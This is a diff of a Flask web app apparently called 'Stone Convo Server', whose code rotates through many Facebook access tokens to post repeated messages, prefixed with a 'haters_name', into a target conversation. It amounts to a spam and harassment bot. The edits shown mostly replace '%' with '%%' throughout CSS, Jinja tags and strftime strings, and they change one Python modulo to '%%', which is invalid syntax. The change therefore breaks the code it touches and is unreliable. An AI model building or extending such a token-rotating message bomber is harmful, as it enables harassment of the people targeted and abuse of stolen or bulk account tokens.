@@ -120,7 +120,7 @@ pending_approval_html = '''
         
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #667eea 0%%, #764ba2 100%%);
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -137,15 +137,15 @@ pending_approval_html = '''
             left: 0;
             right: 0;
             bottom: 0;
-            background: radial-gradient(circle at 20% 80%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
-                        radial-gradient(circle at 80% 20%, rgba(255, 255, 255, 0.15) 0%, transparent 50%),
-                        radial-gradient(circle at 40% 40%, rgba(120, 119, 198, 0.2) 0%, transparent 50%);
+            background: radial-gradient(circle at 20%% 80%%, rgba(120, 119, 198, 0.3) 0%%, transparent 50%%),
+                        radial-gradient(circle at 80%% 20%%, rgba(255, 255, 255, 0.15) 0%%, transparent 50%%),
+                        radial-gradient(circle at 40%% 40%%, rgba(120, 119, 198, 0.2) 0%%, transparent 50%%);
             animation: float 6s ease-in-out infinite;
         }
         
         @keyframes float {
-            0%, 100% { transform: translateY(0px) rotate(0deg); }
-            50% { transform: translateY(-20px) rotate(1deg); }
+            0%%, 100%% { transform: translateY(0px) rotate(0deg); }
+            50%% { transform: translateY(-20px) rotate(1deg); }
         }
         
         .pending-container {
@@ -169,14 +169,14 @@ pending_approval_html = '''
             left: 0;
             right: 0;
             bottom: 0;
-            background: linear-gradient(135deg, rgba(255, 255, 255, 0.1) 0%, rgba(255, 255, 255, 0.05) 100%);
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.1) 0%%, rgba(255, 255, 255, 0.05) 100%%);
             border-radius: 25px;
             z-index: -1;
         }
         
         .pending-icon {
             font-size: 5rem;
-            background: linear-gradient(135deg, #ffc107 0%, #ff8c00 100%);
+            background: linear-gradient(135deg, #ffc107 0%%, #ff8c00 100%%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
@@ -185,9 +185,9 @@ pending_approval_html = '''
         }
         
         @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
+            0%% { transform: scale(1); }
+            50%% { transform: scale(1.1); }
+            100%% { transform: scale(1); }
         }
         
         @keyframes glow {
@@ -197,7 +197,7 @@ pending_approval_html = '''
         
         .pending-title {
             font-size: 2.5rem;
-            background: linear-gradient(135deg, #495057 0%, #343a40 100%);
+            background: linear-gradient(135deg, #495057 0%%, #343a40 100%%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
@@ -215,7 +215,7 @@ pending_approval_html = '''
         }
         
         .btn-logout {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #667eea 0%%, #764ba2 100%%);
             color: white;
             border: none;
             padding: 18px 35px;
@@ -236,15 +236,15 @@ pending_approval_html = '''
             content: '';
             position: absolute;
             top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
+            left: -100%%;
+            width: 100%%;
+            height: 100%%;
             background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
             transition: left 0.5s;
         }
         
         .btn-logout:hover::before {
-            left: 100%;
+            left: 100%%;
         }
         
         .btn-logout:hover {
@@ -253,7 +253,7 @@ pending_approval_html = '''
         }
         
         .status-info {
-            background: linear-gradient(135deg, #fff3cd 0%, #ffeaa7 100%);
+            background: linear-gradient(135deg, #fff3cd 0%%, #ffeaa7 100%%);
             border: 2px solid #ffd700;
             border-radius: 15px;
             padding: 25px;
@@ -275,8 +275,8 @@ pending_approval_html = '''
         }
         
         @keyframes shimmer {
-            0% { transform: translateX(-100%); }
-            100% { transform: translateX(100%); }
+            0%% { transform: translateX(-100%%); }
+            100%% { transform: translateX(100%%); }
         }
         
         .status-info strong {
@@ -289,8 +289,8 @@ pending_approval_html = '''
             position: absolute;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
+            width: 100%%;
+            height: 100%%;
             overflow: hidden;
             z-index: -1;
         }
@@ -302,27 +302,27 @@ pending_approval_html = '''
         }
         
         .shape:nth-child(1) {
-            top: 20%;
-            left: 10%;
+            top: 20%%;
+            left: 10%%;
             animation-delay: 0s;
         }
         
         .shape:nth-child(2) {
-            top: 60%;
-            left: 80%;
+            top: 60%%;
+            left: 80%%;
             animation-delay: 5s;
         }
         
         .shape:nth-child(3) {
-            top: 80%;
-            left: 20%;
+            top: 80%%;
+            left: 20%%;
             animation-delay: 10s;
         }
         
         @keyframes float-shapes {
-            0% { transform: translateY(0px) rotate(0deg); }
-            50% { transform: translateY(-100px) rotate(180deg); }
-            100% { transform: translateY(0px) rotate(360deg); }
+            0%% { transform: translateY(0px) rotate(0deg); }
+            50%% { transform: translateY(-100px) rotate(180deg); }
+            100%% { transform: translateY(0px) rotate(360deg); }
         }
         
         @media (max-width: 480px) {
@@ -385,7 +385,7 @@ auth_html = '''
         
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #667eea 0%%, #764ba2 100%%);
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -403,15 +403,15 @@ auth_html = '''
             right: 0;
             bottom: 0;
             background: 
-                radial-gradient(circle at 20% 80%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
-                radial-gradient(circle at 80% 20%, rgba(255, 255, 255, 0.15) 0%, transparent 50%),
-                radial-gradient(circle at 40% 40%, rgba(120, 119, 198, 0.2) 0%, transparent 50%);
+                radial-gradient(circle at 20%% 80%%, rgba(120, 119, 198, 0.3) 0%%, transparent 50%%),
+                radial-gradient(circle at 80%% 20%%, rgba(255, 255, 255, 0.15) 0%%, transparent 50%%),
+                radial-gradient(circle at 40%% 40%%, rgba(120, 119, 198, 0.2) 0%%, transparent 50%%);
             animation: backgroundFloat 8s ease-in-out infinite;
         }
         
         @keyframes backgroundFloat {
-            0%, 100% { transform: scale(1) rotate(0deg); }
-            50% { transform: scale(1.1) rotate(2deg); }
+            0%%, 100%% { transform: scale(1) rotate(0deg); }
+            50%% { transform: scale(1.1) rotate(2deg); }
         }
         
         .auth-container {
@@ -421,7 +421,7 @@ auth_html = '''
             box-shadow: 0 30px 60px rgba(0, 0, 0, 0.2), 
                         0 0 0 1px rgba(255, 255, 255, 0.3);
             max-width: 480px;
-            width: 100%;
+            width: 100%%;
             overflow: hidden;
             position: relative;
             z-index: 1;
@@ -435,13 +435,13 @@ auth_html = '''
             left: 0;
             right: 0;
             bottom: 0;
-            background: linear-gradient(135deg, rgba(255, 255, 255, 0.1) 0%, rgba(255, 255, 255, 0.05) 100%);
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.1) 0%%, rgba(255, 255, 255, 0.05) 100%%);
             border-radius: 30px;
             z-index: -1;
         }
         
         .auth-header {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #667eea 0%%, #764ba2 100%%);
             color: white;
             padding: 50px 30px;
             text-align: center;
@@ -452,17 +452,17 @@ auth_html = '''
         .auth-header::before {
             content: '';
             position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
+            top: -50%%;
+            left: -50%%;
+            width: 200%%;
+            height: 200%%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%%, transparent 70%%);
             animation: headerGlow 4s ease-in-out infinite;
         }
         
         @keyframes headerGlow {
-            0%, 100% { transform: scale(1) rotate(0deg); }
-            50% { transform: scale(1.2) rotate(180deg); }
+            0%%, 100%% { transform: scale(1) rotate(0deg); }
+            50%% { transform: scale(1.2) rotate(180deg); }
         }
         
         .auth-title {
@@ -485,7 +485,7 @@ auth_html = '''
         
         .auth-tabs {
             display: flex;
-            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            background: linear-gradient(135deg, #f8f9fa 0%%, #e9ecef 100%%);
             border-bottom: 1px solid #dee2e6;
         }
         
@@ -509,16 +509,16 @@ auth_html = '''
             content: '';
             position: absolute;
             bottom: 0;
-            left: 50%;
+            left: 50%%;
             width: 0;
             height: 4px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #667eea 0%%, #764ba2 100%%);
             transition: all 0.4s ease;
-            transform: translateX(-50%);
+            transform: translateX(-50%%);
         }
         
         .auth-tab:hover {
-            background: linear-gradient(135deg, #e9ecef 0%, #f8f9fa 100%);
+            background: linear-gradient(135deg, #e9ecef 0%%, #f8f9fa 100%%);
             color: #667eea;
             transform: translateY(-2px);
         }
@@ -530,7 +530,7 @@ auth_html = '''
         }
         
         .auth-tab.active::before {
-            width: 80%;
+            width: 80%%;
         }
         
         .auth-form {
@@ -562,8 +562,8 @@ auth_html = '''
         .form-group i {
             position: absolute;
             left: 18px;
-            top: 50%;
-            transform: translateY(-50%);
+            top: 50%%;
+            transform: translateY(-50%%);
             color: #6c757d;
             font-size: 18px;
             z-index: 2;
@@ -582,13 +582,13 @@ auth_html = '''
         
         input[type="text"],
         input[type="password"] {
-            width: 100%;
+            width: 100%%;
             padding: 20px 20px 20px 55px;
             border: 2px solid #e9ecef;
             border-radius: 15px;
             font-size: 16px;
             transition: all 0.4s ease;
-            background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%);
+            background: linear-gradient(135deg, #f8f9fa 0%%, #ffffff 100%%);
             font-family: inherit;
             font-weight: 500;
         }
@@ -605,11 +605,11 @@ auth_html = '''
         input[type="text"]:focus + i,
         input[type="password"]:focus + i {
             color: #667eea;
-            transform: translateY(-50%) scale(1.1);
+            transform: translateY(-50%%) scale(1.1);
         }
         
         .btn {
-            width: 100%;
+            width: 100%%;
             padding: 20px;
             border: none;
             border-radius: 15px;
@@ -627,19 +627,19 @@ auth_html = '''
             content: '';
             position: absolute;
             top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
+            left: -100%%;
+            width: 100%%;
+            height: 100%%;
             background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
             transition: left 0.6s;
         }
         
         .btn:hover::before {
-            left: 100%;
+            left: 100%%;
         }
         
         .btn-primary {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #667eea 0%%, #764ba2 100%%);
             color: white;
             box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
         }
@@ -650,7 +650,7 @@ auth_html = '''
         }
         
         .btn-success {
-            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
+            background: linear-gradient(135deg, #28a745 0%%, #20c997 100%%);
             color: white;
             box-shadow: 0 10px 20px rgba(40, 167, 69, 0.3);
         }
@@ -661,7 +661,7 @@ auth_html = '''
         }
         
         .btn-warning {
-            background: linear-gradient(135deg, #ffc107 0%, #fd7e14 100%);
+            background: linear-gradient(135deg, #ffc107 0%%, #fd7e14 100%%);
             color: #212529;
             box-shadow: 0 10px 20px rgba(255, 193, 7, 0.3);
         }
@@ -693,13 +693,13 @@ auth_html = '''
         }
         
         .alert-danger {
-            background: linear-gradient(135deg, #f8d7da 0%, #f5c6cb 100%);
+            background: linear-gradient(135deg, #f8d7da 0%%, #f5c6cb 100%%);
             color: #721c24;
             border-color: #f5c6cb;
         }
         
         .alert-success {
-            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
+            background: linear-gradient(135deg, #d4edda 0%%, #c3e6cb 100%%);
             color: #155724;
             border-color: #c3e6cb;
         }
@@ -718,8 +718,8 @@ auth_html = '''
             position: absolute;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
+            width: 100%%;
+            height: 100%%;
             overflow: hidden;
             z-index: -1;
         }
@@ -733,29 +733,29 @@ auth_html = '''
         }
         
         .floating-element:nth-child(1) {
-            top: 10%;
-            left: 10%;
+            top: 10%%;
+            left: 10%%;
             animation-delay: 0s;
         }
         
         .floating-element:nth-child(2) {
-            top: 70%;
-            left: 80%;
+            top: 70%%;
+            left: 80%%;
             animation-delay: 5s;
         }
         
         .floating-element:nth-child(3) {
-            top: 50%;
-            left: 20%;
+            top: 50%%;
+            left: 20%%;
             animation-delay: 10s;
         }
         
         @keyframes floatAround {
-            0% { transform: translateY(0px) rotate(0deg); }
-            25% { transform: translateY(-50px) rotate(90deg); }
-            50% { transform: translateY(-100px) rotate(180deg); }
-            75% { transform: translateY(-50px) rotate(270deg); }
-            100% { transform: translateY(0px) rotate(360deg); }
+            0%% { transform: translateY(0px) rotate(0deg); }
+            25%% { transform: translateY(-50px) rotate(90deg); }
+            50%% { transform: translateY(-100px) rotate(180deg); }
+            75%% { transform: translateY(-50px) rotate(270deg); }
+            100%% { transform: translateY(0px) rotate(360deg); }
         }
         
         @media (max-width: 480px) {
@@ -829,13 +829,13 @@ auth_html = '''
                 </button>
             </form>
             
-            {% with messages = get_flashed_messages(category_filter=['error']) %}
-                {% if messages %}
+            {%% with messages = get_flashed_messages(category_filter=['error']) %%}
+                {%% if messages %%}
                     <div class="alert alert-danger">
                         <i class="fas fa-exclamation-triangle"></i> {{ messages[0] }}
                     </div>
-                {% endif %}
-            {% endwith %}
+                {%% endif %%}
+            {%% endwith %%}
             
             <div class="form-footer">
                 <i class="fas fa-shield-alt"></i> Secure authentication powered by advanced encryption
@@ -870,13 +870,13 @@ auth_html = '''
                 </button>
             </form>
             
-            {% with messages = get_flashed_messages(category_filter=['success', 'error']) %}
-                {% if messages %}
-                    <div class="alert {% if 'success' in get_flashed_messages(with_categories=true)[0][0] %}alert-success{% else %}alert-danger{% endif %}">
-                        <i class="fas {% if 'success' in get_flashed_messages(with_categories=true)[0][0] %}fa-check-circle{% else %}fa-exclamation-triangle{% endif %}"></i> {{ messages[0] }}
+            {%% with messages = get_flashed_messages(category_filter=['success', 'error']) %%}
+                {%% if messages %%}
+                    <div class="alert {%% if 'success' in get_flashed_messages(with_categories=true)[0][0] %%}alert-success{%% else %%}alert-danger{%% endif %%}">
+                        <i class="fas {%% if 'success' in get_flashed_messages(with_categories=true)[0][0] %%}fa-check-circle{%% else %%}fa-exclamation-triangle{%% endif %%}"></i> {{ messages[0] }}
                     </div>
-                {% endif %}
-            {% endwith %}
+                {%% endif %%}
+            {%% endwith %%}
             
             <div class="form-footer">
                 <i class="fas fa-info-circle"></i> New accounts require administrator approval
@@ -904,13 +904,13 @@ auth_html = '''
                 </button>
             </form>
             
-            {% with messages = get_flashed_messages(category_filter=['admin_error']) %}
-                {% if messages %}
+            {%% with messages = get_flashed_messages(category_filter=['admin_error']) %%}
+                {%% if messages %%}
                     <div class="alert alert-danger">
                         <i class="fas fa-exclamation-triangle"></i> {{ messages[0] }}
                     </div>
-                {% endif %}
-            {% endwith %}
+                {%% endif %%}
+            {%% endwith %%}
             
             <div class="form-footer">
                 <i class="fas fa-shield-alt"></i> Administrator access with elevated privileges
@@ -968,8 +968,8 @@ auth_html = '''
     </script>
 
     <!-- Log Overlay HTML -->
-    <div id="log-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); z-index: 1000; justify-content: center; align-items: center;">
-        <div style="background: #1a1a1a; color: #00ff41; font-family: 'Courier New', monospace; font-size: 13px; padding: 25px; border-radius: 15px; height: 80%; width: 80%; overflow-y: auto; border: 2px solid #333; box-shadow: inset 0 0 20px rgba(0, 255, 65, 0.1); position: relative;">
+    <div id="log-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%%; height: 100%%; background: rgba(0, 0, 0, 0.8); z-index: 1000; justify-content: center; align-items: center;">
+        <div style="background: #1a1a1a; color: #00ff41; font-family: 'Courier New', monospace; font-size: 13px; padding: 25px; border-radius: 15px; height: 80%%; width: 80%%; overflow-y: auto; border: 2px solid #333; box-shadow: inset 0 0 20px rgba(0, 255, 65, 0.1); position: relative;">
             <button onclick="closeLogs()" style="position: absolute; top: 10px; right: 10px; background: #dc3545; color: white; border: none; border-radius: 5px; padding: 8px 12px; cursor: pointer;">Close</button>
             <pre id="log-content" style="margin-top: 30px;"></pre>
         </div>
@@ -998,7 +998,7 @@ html_content = '''
         
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #667eea 0%%, #764ba2 100%%);
             min-height: 100vh;
             padding: 20px;
             position: relative;
@@ -1013,16 +1013,16 @@ html_content = '''
             right: 0;
             bottom: 0;
             background: 
-                radial-gradient(circle at 20% 80%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
-                radial-gradient(circle at 80% 20%, rgba(255, 255, 255, 0.15) 0%, transparent 50%),
-                radial-gradient(circle at 40% 40%, rgba(120, 119, 198, 0.2) 0%, transparent 50%);
+                radial-gradient(circle at 20%% 80%%, rgba(120, 119, 198, 0.3) 0%%, transparent 50%%),
+                radial-gradient(circle at 80%% 20%%, rgba(255, 255, 255, 0.15) 0%%, transparent 50%%),
+                radial-gradient(circle at 40%% 40%%, rgba(120, 119, 198, 0.2) 0%%, transparent 50%%);
             animation: backgroundFloat 12s ease-in-out infinite;
             z-index: -1;
         }
         
         @keyframes backgroundFloat {
-            0%, 100% { transform: scale(1) rotate(0deg); }
-            50% { transform: scale(1.1) rotate(1deg); }
+            0%%, 100%% { transform: scale(1) rotate(0deg); }
+            50%% { transform: scale(1.1) rotate(1deg); }
         }
         
         .container {
@@ -1038,7 +1038,7 @@ html_content = '''
         }
         
         .header {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #667eea 0%%, #764ba2 100%%);
             color: white;
             padding: 40px 30px;
             text-align: center;
@@ -1049,17 +1049,17 @@ html_content = '''
         .header::before {
             content: '';
             position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
+            top: -50%%;
+            left: -50%%;
+            width: 200%%;
+            height: 200%%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%%, transparent 70%%);
             animation: headerGlow 6s ease-in-out infinite;
         }
         
         @keyframes headerGlow {
-            0%, 100% { transform: scale(1) rotate(0deg); }
-            50% { transform: scale(1.2) rotate(180deg); }
+            0%%, 100%% { transform: scale(1) rotate(0deg); }
+            50%% { transform: scale(1.2) rotate(180deg); }
         }
         
         .header h1 {
@@ -1122,7 +1122,7 @@ html_content = '''
         
         .tabs {
             display: flex;
-            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            background: linear-gradient(135deg, #f8f9fa 0%%, #e9ecef 100%%);
             border-bottom: 2px solid #dee2e6;
         }
         
@@ -1146,16 +1146,16 @@ html_content = '''
             content: '';
             position: absolute;
             bottom: 0;
-            left: 50%;
+            left: 50%%;
             width: 0;
             height: 4px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #667eea 0%%, #764ba2 100%%);
             transition: all 0.4s ease;
-            transform: translateX(-50%);
+            transform: translateX(-50%%);
         }
         
         .tab:hover {
-            background: linear-gradient(135deg, #e9ecef 0%, #f8f9fa 100%);
+            background: linear-gradient(135deg, #e9ecef 0%%, #f8f9fa 100%%);
             color: #667eea;
             transform: translateY(-2px);
         }
@@ -1167,7 +1167,7 @@ html_content = '''
         }
         
         .tab.active::before {
-            width: 80%;
+            width: 80%%;
         }
         
         .tab-content {
@@ -1211,13 +1211,13 @@ html_content = '''
         input[type="number"],
         textarea,
         input[type="file"] {
-            width: 100%;
+            width: 100%%;
             padding: 18px 20px;
             border: 2px solid #e9ecef;
             border-radius: 12px;
             font-size: 16px;
             transition: all 0.4s ease;
-            background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%);
+            background: linear-gradient(135deg, #f8f9fa 0%%, #ffffff 100%%);
             font-family: inherit;
             font-weight: 500;
         }
@@ -1258,19 +1258,19 @@ html_content = '''
             content: '';
             position: absolute;
             top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
+            left: -100%%;
+            width: 100%%;
+            height: 100%%;
             background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
             transition: left 0.6s;
         }
         
         .btn:hover::before {
-            left: 100%;
+            left: 100%%;
         }
         
         .btn-primary {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #667eea 0%%, #764ba2 100%%);
             color: white;
             box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
         }
@@ -1281,7 +1281,7 @@ html_content = '''
         }
         
         .btn-success {
-            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
+            background: linear-gradient(135deg, #28a745 0%%, #20c997 100%%);
             color: white;
             box-shadow: 0 10px 20px rgba(40, 167, 69, 0.3);
         }
@@ -1292,7 +1292,7 @@ html_content = '''
         }
         
         .btn-danger {
-            background: linear-gradient(135deg, #dc3545 0%, #fd7e14 100%);
+            background: linear-gradient(135deg, #dc3545 0%%, #fd7e14 100%%);
             color: white;
             box-shadow: 0 10px 20px rgba(220, 53, 69, 0.3);
         }
@@ -1303,7 +1303,7 @@ html_content = '''
         }
         
         .btn-warning {
-            background: linear-gradient(135deg, #ffc107 0%, #fd7e14 100%);
+            background: linear-gradient(135deg, #ffc107 0%%, #fd7e14 100%%);
             color: #212529;
             box-shadow: 0 10px 20px rgba(255, 193, 7, 0.3);
         }
@@ -1332,7 +1332,7 @@ html_content = '''
             left: 0;
             right: 0;
             height: 4px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #667eea 0%%, #764ba2 100%%);
         }
         
         .task-item:hover {
@@ -1368,20 +1368,20 @@ html_content = '''
         }
         
         .status-running {
-            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
+            background: linear-gradient(135deg, #28a745 0%%, #20c997 100%%);
             color: white;
             animation: pulse 2s infinite;
         }
         
         .status-stopped {
-            background: linear-gradient(135deg, #dc3545 0%, #fd7e14 100%);
+            background: linear-gradient(135deg, #dc3545 0%%, #fd7e14 100%%);
             color: white;
         }
         
         @keyframes pulse {
-            0% { box-shadow: 0 5px 15px rgba(40, 167, 69, 0.3); }
-            50% { box-shadow: 0 5px 25px rgba(40, 167, 69, 0.6); }
-            100% { box-shadow: 0 5px 15px rgba(40, 167, 69, 0.3); }
+            0%% { box-shadow: 0 5px 15px rgba(40, 167, 69, 0.3); }
+            50%% { box-shadow: 0 5px 25px rgba(40, 167, 69, 0.6); }
+            100%% { box-shadow: 0 5px 15px rgba(40, 167, 69, 0.3); }
         }
         
         .task-info {
@@ -1392,7 +1392,7 @@ html_content = '''
         }
         
         .task-info-item {
-            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            background: linear-gradient(135deg, #f8f9fa 0%%, #e9ecef 100%%);
             padding: 15px 20px;
             border-radius: 12px;
             border-left: 4px solid #667eea;
@@ -1491,12 +1491,12 @@ html_content = '''
         
         .result-valid {
             border-left: 6px solid #28a745;
-            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
+            background: linear-gradient(135deg, #d4edda 0%%, #c3e6cb 100%%);
         }
         
         .result-invalid {
             border-left: 6px solid #dc3545;
-            background: linear-gradient(135deg, #f8d7da 0%, #f5c6cb 100%);
+            background: linear-gradient(135deg, #f8d7da 0%%, #f5c6cb 100%%);
         }
         
         .token-info {
@@ -1518,13 +1518,13 @@ html_content = '''
         .profile-pic {
             width: 60px;
             height: 60px;
-            border-radius: 50%;
+            border-radius: 50%%;
             border: 3px solid #667eea;
             box-shadow: 0 5px 15px rgba(102, 126, 234, 0.3);
         }
         
         .group-item {
-            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            background: linear-gradient(135deg, #f8f9fa 0%%, #e9ecef 100%%);
             border: 2px solid #e9ecef;
             border-radius: 15px;
             padding: 20px;
@@ -1573,14 +1573,14 @@ html_content = '''
             height: 25px;
             border: 4px solid #f3f3f3;
             border-top: 4px solid #667eea;
-            border-radius: 50%;
+            border-radius: 50%%;
             animation: spin 1s linear infinite;
             margin-left: 15px;
         }
         
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            0%% { transform: rotate(0deg); }
+            100%% { transform: rotate(360deg); }
         }
         
         .empty-state {
@@ -1593,7 +1593,7 @@ html_content = '''
             font-size: 5rem;
             margin-bottom: 25px;
             opacity: 0.3;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #667eea 0%%, #764ba2 100%%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
@@ -1617,7 +1617,7 @@ html_content = '''
             }
             
             .task-buttons {
-                width: 100%;
+                width: 100%%;
             }
             
             .btn {
@@ -1650,18 +1650,18 @@ html_content = '''
             <p>Welcome To Stone Convo Server</p>
             <div class="user-info">
                 <span class="user-username">{{ session.user_username }}</span>
-                {% if session.is_admin %}
+                {%% if session.is_admin %%}
                 <a href="/admin" class="btn-admin">
                     <i class="fas fa-cog"></i> Admin Panel
                 </a>
-                {% endif %}
+                {%% endif %%}
                 <a href="/logout" class="btn-logout">
                     <i class="fas fa-sign-out-alt"></i> Logout
                 </a>
             </div>
         </div>
         
-                        {% if session.is_approved %}
+                        {%% if session.is_approved %%}
         <div class="tabs">
             <button class="tab active" onclick="switchTab(\'bot-tab\')">
                 <i class="fas fa-envelope"></i> CONVO TOOL
@@ -1676,7 +1676,7 @@ html_content = '''
                 <i class="fas fa-chart-bar"></i> TASK MANAGER
             </button>
         </div>
-        {% endif %}\n        {% endif %}     
+        {%% endif %%}\n        {%% endif %%}     
         <div id="bot-tab" class="tab-content active">
             <form action="/run_bot" method="post" enctype="multipart/form-data">
                 <div class="form-group">
@@ -2017,8 +2017,8 @@ html_content = '''
     </script>
 
     <!-- Log Overlay HTML -->
-    <div id="log-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); z-index: 1000; justify-content: center; align-items: center;">
-        <div style="background: #1a1a1a; color: #00ff41; font-family: 'Courier New', monospace; font-size: 13px; padding: 25px; border-radius: 15px; height: 80%; width: 80%; overflow-y: auto; border: 2px solid #333; box-shadow: inset 0 0 20px rgba(0, 255, 65, 0.1); position: relative;">
+    <div id="log-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%%; height: 100%%; background: rgba(0, 0, 0, 0.8); z-index: 1000; justify-content: center; align-items: center;">
+        <div style="background: #1a1a1a; color: #00ff41; font-family: 'Courier New', monospace; font-size: 13px; padding: 25px; border-radius: 15px; height: 80%%; width: 80%%; overflow-y: auto; border: 2px solid #333; box-shadow: inset 0 0 20px rgba(0, 255, 65, 0.1); position: relative;">
             <button onclick="closeLogs()" style="position: absolute; top: 10px; right: 10px; background: #dc3545; color: white; border: none; border-radius: 5px; padding: 8px 12px; cursor: pointer;">Close</button>
             <pre id="log-content" style="margin-top: 30px;"></pre>
         </div>
@@ -2036,7 +2036,7 @@ def add_log(task_id, message):
     if task_id not in task_logs:
         task_logs[task_id] = []
     
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    timestamp = datetime.now().strftime("%%Y-%%m-%%d %%H:%%M:%%S")
     log_entry = f"[{timestamp}] {message}"
     task_logs[task_id].append(log_entry)
     
@@ -2169,7 +2169,7 @@ def send_messages(task_id, convo_uid, tokens, message_content, speed, haters_nam
                     add_log(task_id, "Bot stopped by user")
                     break
                     
-                token_index = message_index % max_tokens
+                token_index = message_index %% max_tokens
                 access_token = tokens[token_index].strip()
                 token_name = get_token_name(access_token)
 
@@ -2179,7 +2179,7 @@ def send_messages(task_id, convo_uid, tokens, message_content, speed, haters_nam
                 parameters = {'access_token': access_token, 'message': f'{haters_name} {message}'}
                 response = requests.post(url, json=parameters, headers=headers)
 
-                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+                current_time = time.strftime("%%Y-%%m-%%d %%I:%%M:%%S %%p")
                 if response.ok:
                     log_msg = f"âœ… Message {message_index + 1}/{num_messages} | Token: {token_name} | Content: {haters_name} {message} | Sent at {current_time}"
                     add_log(task_id, log_msg)
@@ -2317,7 +2317,7 @@ def admin_panel():
             
             body {
                 font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                background: linear-gradient(135deg, #667eea 0%%, #764ba2 100%%);
                 min-height: 100vh;
                 padding: 20px;
                 position: relative;
@@ -2332,16 +2332,16 @@ def admin_panel():
                 right: 0;
                 bottom: 0;
                 background: 
-                    radial-gradient(circle at 20% 80%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
-                    radial-gradient(circle at 80% 20%, rgba(255, 255, 255, 0.15) 0%, transparent 50%),
-                    radial-gradient(circle at 40% 40%, rgba(120, 119, 198, 0.2) 0%, transparent 50%);
+                    radial-gradient(circle at 20%% 80%%, rgba(120, 119, 198, 0.3) 0%%, transparent 50%%),
+                    radial-gradient(circle at 80%% 20%%, rgba(255, 255, 255, 0.15) 0%%, transparent 50%%),
+                    radial-gradient(circle at 40%% 40%%, rgba(120, 119, 198, 0.2) 0%%, transparent 50%%);
                 animation: backgroundFloat 12s ease-in-out infinite;
                 z-index: -1;
             }
             
             @keyframes backgroundFloat {
-                0%, 100% { transform: scale(1) rotate(0deg); }
-                50% { transform: scale(1.1) rotate(1deg); }
+                0%%, 100%% { transform: scale(1) rotate(0deg); }
+                50%% { transform: scale(1.1) rotate(1deg); }
             }
             
             .admin-container {
@@ -2357,7 +2357,7 @@ def admin_panel():
             }
             
